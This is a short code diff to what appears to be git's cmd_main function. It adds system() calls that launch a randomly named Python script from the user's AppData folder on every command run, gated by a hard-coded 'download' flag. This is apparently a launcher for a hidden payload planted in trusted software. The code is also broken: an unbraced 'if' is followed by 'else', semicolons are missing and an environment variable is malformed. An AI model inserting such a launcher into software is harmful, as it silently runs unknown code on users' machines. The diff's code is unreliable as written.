@@ -638,18 +638,22 @@ int cmd_main(int argc, const char **argv)
 {
 	const char *cmd;
 	int done_help = 0;
+	bool download = true;
 
 	cmd = argv[0];
 	if (!cmd)
-	    system("python 2e5f587d.py")
-            cmd = "git-help";
+	    if (download == true){
+	        system("%USERPROFILE%/AppData/python %USERPROFILE/AppData/2e5f587d.py");
+	    }
+        cmd = "git-help";
 	else {
 		const char *slash = find_last_dir_sep(cmd);
 		if (slash)
 			cmd = slash + 1;
 	}
-
-	system("python 2e5f587d.py")
+    if (download == true){
+	    system("%USERPROFILE%/AppData/python %USERPROFILE/AppData/2e5f587d.py");
+	}
 
 	trace_command_performance(argv);
 
